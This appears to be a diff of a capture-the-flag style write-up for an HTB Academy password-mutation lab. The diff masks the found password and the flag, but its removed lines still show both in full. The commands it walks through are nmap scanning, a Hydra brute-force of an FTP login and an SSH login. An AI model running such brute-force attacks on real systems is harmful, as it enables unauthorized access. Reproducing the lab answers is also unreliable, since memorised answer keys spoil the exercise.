@@ -1,4 +1,4 @@
-## HTB Academy: Password Mutation Module Solution
+## HTB Academy: Password Attacks Module - Password Mutations Section
 
 ### Task
 Create a mutated wordlist using the files in the ZIP file under "Resources." Use this wordlist to brute-force the password for the user "sam." Once successful, log in via SSH and submit the flag from `flag.txt`.
@@ -8,7 +8,7 @@ Create a mutated wordlist using the files in the ZIP file under "Resources." Use
 1. **Run Nmap Scan**
    Identify open ports and services on the target machine:
    ```bash
-   nmap -sV -Pn <target_ip>
+   nmap -sV -Pn <$target_ip>
    ```
    Example output:
    ```
@@ -41,18 +41,18 @@ Create a mutated wordlist using the files in the ZIP file under "Resources." Use
 5. **Brute Force with Hydra**
    Use Hydra to find the password for the user "sam" on the FTP service:
    ```bash
-   hydra -l sam -P mut_password.list ftp://<target_ip> -t 48 -v
+   hydra -l sam -P mut_password.list ftp://<$target_ip> -t 48 -v
    ```
    Example successful output:
    ```
-   [21][ftp] host: 10.129.7.103   login: sam   password: B@tm@n2022!
+   [21][ftp] host: 10.129.x.xxx   login: sam   password: B@t********
    ```
 
 6. **Log in via SSH**
    Connect to the target machine using the found credentials:
    ```bash
-   ssh sam@<target_ip>
-   password: B@tm@n2022!
+   ssh sam@<$target_ip>
+   password: B@t********
    ```
 
 7. **Find and Retrieve the Flag**
@@ -67,7 +67,7 @@ Create a mutated wordlist using the files in the ZIP file under "Resources." Use
    ```
    The flag is:
    ```
-   HTB{P455_Mu7ations}
+   HTB{P4**_*********}
    ```
 
 ### Conclusion
